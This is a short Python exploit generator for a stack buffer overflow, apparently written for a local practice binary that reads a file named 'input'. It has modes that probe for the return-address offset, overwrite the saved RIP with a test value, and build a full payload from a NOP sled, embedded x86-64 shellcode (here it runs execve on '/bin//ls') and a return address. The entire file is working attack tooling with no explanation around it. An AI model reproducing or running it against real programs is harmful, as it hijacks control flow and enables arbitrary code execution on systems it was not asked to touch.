#!/usr/bin/env python3

import sys

INPUT_FILE = "input"
SHELL_CODE = b"\x48\x31\xc0\x48\x31\xd2\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x6c\x73\x51\x48\x89\xe7\xb9\x2e\x2f\x00\x00\x51\x48\x89\xe6\x50\x56\x57\x48\x89\xe6\xb8\x3b\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\x0f\x05\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x40\x00"
NOP_OPCODE = 0x90
NOP_PREFIX = 16

def help() -> None:
    print("probe")
    print("rip <needle>")
    print("exploit <needle> <shellcode-address>")

def gen_probe() -> None:
    with open(INPUT_FILE, "wb") as f:
        for i in range(256):
            f.write(i.to_bytes(1, "little"))


def gen_rip_hijack(val: str) -> None:
    needle = int(val, 16)
    print("RIP starts at index {}".format(needle))
    with open(INPUT_FILE, "wb") as f:
        for i in range(needle):
            f.write(i.to_bytes(1, "little"))

        # write an arbitrary address
        f.write((0x0000414141414141).to_bytes(8, "little"))


def gen_exploit(rip: str, buf: str) -> None:
    needle = int(rip, 16)
    print("RIP starts at index {}".format(needle))
    buf_addr = int(buf, 16)
    print("Shellcode address: 0x{:02X}".format(buf_addr))

    with open(INPUT_FILE, "wb") as f:
        for _ in range(NOP_PREFIX):
            f.write(NOP_OPCODE.to_bytes(1, "little"))
        f.write(SHELL_CODE)
        for _ in range(len(SHELL_CODE) + NOP_PREFIX, needle, 1):
            f.write(NOP_OPCODE.to_bytes(1, "little"))

        # write an arbitrary address
        f.write(buf_addr.to_bytes(8, "little"))


if __name__ == "__main__":
    if len(sys.argv) == 1:
        help()
    elif sys.argv[1] == "probe":
        gen_probe()
    elif sys.argv[1] == "rip":
        gen_rip_hijack(sys.argv[2])
    elif sys.argv[1] == "exploit":
        gen_exploit(sys.argv[2], sys.argv[3])
    else:
        help()
